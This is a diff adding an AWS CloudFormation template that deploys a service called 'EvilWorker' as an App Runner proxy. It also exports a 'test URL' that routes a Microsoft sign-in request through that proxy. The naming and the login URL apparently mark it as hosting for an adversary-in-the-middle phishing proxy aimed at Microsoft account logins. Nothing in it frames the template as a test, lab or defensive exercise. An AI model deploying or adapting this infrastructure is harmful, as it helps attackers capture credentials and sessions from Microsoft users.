@@ -1,0 +1,41 @@
+AWSTemplateFormatVersion: '2010-09-09'
+Description: 'EvilWorker AWS Deployment'
+
+Parameters:
+  ServiceName:
+    Type: String
+    Default: evilworker-proxy
+    Description: Name of the App Runner service
+
+Resources:
+  # App Runner Service
+  EvilWorkerService:
+    Type: AWS::AppRunner::Service
+    Properties:
+      ServiceName: !Ref ServiceName
+      SourceConfiguration:
+        ImageRepository:
+          ImageIdentifier: public.ecr.aws/docker/library/node:18-alpine
+          ImageConfiguration:
+            Port: "3000"
+            RuntimeEnvironmentVariables:
+              - Name: PORT
+                Value: "3000"
+          ImageRepositoryType: ECR_PUBLIC
+        AutoDeploymentsEnabled: true
+      InstanceConfiguration:
+        Cpu: "0.25 vCPU"
+        Memory: "0.5 GB"
+
+Outputs:
+  ServiceUrl:
+    Description: URL of the EvilWorker service
+    Value: !GetAtt EvilWorkerService.ServiceUrl
+    Export:
+      Name: !Sub "${AWS::StackName}-ServiceUrl"
+  
+  TestUrl:
+    Description: Test URL for Microsoft login
+    Value: !Sub "${EvilWorkerService.ServiceUrl}/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F"
+    Export:
+      Name: !Sub "${AWS::StackName}-TestUrl"
